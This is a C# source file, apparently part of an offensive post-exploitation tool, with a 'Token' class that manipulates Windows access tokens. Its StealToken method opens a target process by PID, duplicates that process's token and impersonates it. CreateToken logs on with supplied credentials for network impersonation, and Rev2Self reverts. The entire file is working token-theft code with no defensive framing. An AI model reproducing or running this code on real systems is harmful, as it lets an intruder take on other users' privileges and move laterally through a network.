using System;

using static NativeMethods;

static class Token
{
    static IntPtr hToken;

    public static bool CreateToken(string username, string domain, string password)
    {
        if (hToken != IntPtr.Zero)
        {
            Rev2Self();
        }

        if (Advapi.LogonUserA(username, domain, password, LogonType.LOGON32_LOGON_NEW_CREDENTIALS, LogonProvider.LOGON32_PROVIDER_DEFAULT, out hToken))
        {
            return Advapi.ImpersonateLoggedOnUser(hToken);
        }
        else
        {
            return false;
        }
    }

    public static bool StealToken(int pid)
    {
        if (hToken != IntPtr.Zero)
        {
            Rev2Self();
        }

        var hProcess = IntPtr.Zero;

        try
        {
            hProcess = Kernel32.OpenProcess(ProcessAccessFlags.QueryInformation, true, pid);

            if (hProcess == IntPtr.Zero)
            {
                return false;
            }

            if (!Advapi.OpenProcessToken(hProcess, DesiredAccess.TOKEN_ASSIGN_PRIMARY | DesiredAccess.TOKEN_DUPLICATE | DesiredAccess.TOKEN_IMPERSONATE | DesiredAccess.TOKEN_QUERY, out IntPtr pToken))
            {
                return false;
            }

            var sa = new SECURITY_ATTRIBUTES();

            if (!Advapi.DuplicateTokenEx(pToken, AccessMask.MAXIMUM_ALLOWED, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenImpersonation, out hToken))
            {
                return false;
            }

            if (!Advapi.ImpersonateLoggedOnUser(hToken))
            {
                return false;
            }
        }
        catch
        {
            return false;
        }
        finally
        {
            Kernel32.CloseHandle(hProcess);
        }

        return true;
    }

    public static bool Rev2Self()
    {
        var rev = Advapi.RevertToSelf();
        Kernel32.CloseHandle(hToken);
        return rev;
    }
}